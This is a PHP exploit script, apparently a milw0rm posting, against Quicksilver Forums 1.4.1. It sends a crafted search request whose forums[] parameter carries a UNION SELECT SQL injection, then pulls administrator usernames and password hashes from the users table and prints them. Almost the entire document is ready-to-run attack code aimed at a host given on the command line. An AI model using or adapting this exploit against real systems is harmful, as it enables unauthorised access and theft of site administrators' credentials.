<?php
/*
. vuln.: Quicksilver Forums 1.4.1 (forums[]) Remote SQL Injection Exploit
. download: http://www.quicksilverforums.com/
.
. author: irk4z[at]yahoo.pl
. homepage: http://irk4z.wordpress.com/
.
. greets: all friends ;)
.
. this is PoC exploit
*/

$host = $argv[1];
$path = $argv[2];
$prefix = "qsf_"; // this is default prefix

echo
".\n. Quicksilver Forums 1.4.1 (forums[]) Remote SQL Injection Exploit\n.\n".
". author: irk4z[at]yahoo.pl\n".
". homepage: http://irk4z.wordpress.com/\n".
".\n".
". usage: php ".$argv[0]." host path\n".
".        php ".$argv[0]." localhost /\n\n";

if(empty($host)||empty($path))die('# wrong host or path..');

$post_data = "query=I-like-it&forums[]=2)/**/limit/**/0/**/UNION/**/SELECT/**/1,1,concat(0x5b3a213a5d,user_name,0x3A,user_password,0x5b3a213a5d),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/FROM/**/".$prefix."users/**/WHERE/**/user_group=1/*&searchtype=match&member_text=&member_select=exact&showposts_check=on&limit_check=on&limit_chars=400&time_check=on&time_way_select=newer&time_select=31&submit=Search";

$data = "POST ".$path."index.php?a=search HTTP/1.1\r\n";
$data .= "Host: ".$host."\r\n";
$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
$data .= "Content-length: ".strlen($post_data)."\r\n";
$data .= "Connection: Close\r\n";
$data .= "\r\n";
$data .= $post_data."\r\n\r\n";

$s = @fsockopen($host, 80);
if (empty($s)) die('# wrong host..');

fputs($s, $data); $retu ='';

while(!feof($s)){
	$retu .= fgets($s);
}

fclose($s);

$tmp = explode('[:!:]',$retu);
if(empty($tmp[1]))die('sorry, exploit failed.. maybe try again in a few seconds..');
echo " " . $tmp[1] . "\n\ndone.";
?>

# milw0rm.com [2008-08-10]
